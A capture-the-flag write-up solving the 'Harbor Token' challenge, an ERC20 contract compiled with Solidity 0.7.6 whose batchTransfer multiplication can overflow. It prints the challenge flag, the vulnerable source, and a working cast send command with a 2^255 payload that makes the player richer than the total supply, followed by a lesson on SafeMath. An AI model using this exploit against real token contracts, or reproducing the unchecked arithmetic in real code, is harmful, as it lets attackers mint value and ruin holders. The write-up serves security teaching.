# Harbor Token — batchTransfer integer overflow (Black Hat India 2026 CTF)

**Flag:** `BlackHatIndia{2_255_t1m3s_tw0_1s_z3r0_s0_th3_b4tch_w4s_fr33_d49a96dc}`

## Prompt (paraphrased)

A fixed-supply ERC20 (HBR, 1,000,000,000 tokens, minted once) adds a
`batchTransfer()` for cheap airdrops: pay the same amount to up to 20
wallets in one call. Compiled with solc 0.7.6 (pre-0.8, so **no built-in
overflow checks**). You start with 1 HBR. Become richer than the whole
token (your balance > `totalSupply()`).

## Source (the bug)

```solidity
// pragma solidity 0.7.6;  -- no automatic overflow checks, no SafeMath used
function batchTransfer(address[] calldata receivers, uint256 value)
    external whenNotPaused returns (bool)
{
    uint256 cnt = receivers.length;
    uint256 amount = cnt * value;                         // <-- can overflow
    require(cnt > 0 && cnt <= 20, "1-20 receivers");
    require(value > 0 && balanceOf[msg.sender] >= amount, "insufficient balance");

    balanceOf[msg.sender] -= amount;
    for (uint256 i = 0; i < cnt; i++) {
        balanceOf[receivers[i]] += value;                  // full, un-wrapped value credited
        emit Transfer(msg.sender, receivers[i], value);
    }
    return true;
}
```

This is the exact class of bug behind the real-world BeautyChain (BEC)
token hack: `amount = cnt * value` can wrap around `2^256`, so the
balance check passes against a tiny (even zero) wrapped `amount`, while
the loop still credits the full, enormous `value` to each receiver.

## Exploit

Pick `cnt = 2` receivers and `value = 2^255`. Then
`cnt * value = 2 * 2^255 = 2^256 ≡ 0 (mod 2^256)`, so the balance check
is satisfied trivially (`balanceOf[msg.sender] >= 0`) even with only 1 HBR.

```bash
cast send "$TOKEN" "batchTransfer(address[],uint256)" "[$PLAYER,0x000000000000000000000000000000000000dEaD]" \
  57896044618658097711785492504343953926634992332820282019728792003956564819968 \
  --rpc-url "$RPC" --private-key "$PK" --gas-limit 500000
```

**Pitfall hit during solving:** the first attempt used the *player's own
address* for **both** receiver slots. That causes a *second* overflow —
`2^255 + 2^255 = 2^256 ≡ 0` again on the same balance slot — which
cancels back out to the original 1 HBR balance (net zero gain). Fixed by
sending the second share to a distinct address (a burn address) so only
one `2^255` credit lands on the player's balance.

Result: player balance jumps to `2^255 ≈ 5.79 × 10^76` HBR, far exceeding
`totalSupply()` (`10^27`), flipping `Setup.isSolved()` to `true`.

## Lesson

Pre-Solidity-0.8 contracts need explicit overflow protection (SafeMath or
manual checks) on every arithmetic operation that touches user-supplied
multipliers — especially batch/multiply-by-count patterns like
`count * amount`. When testing an overflow PoC with multiple output
slots, double check you're not overflowing the SAME destination slot
twice and silently canceling your own exploit.
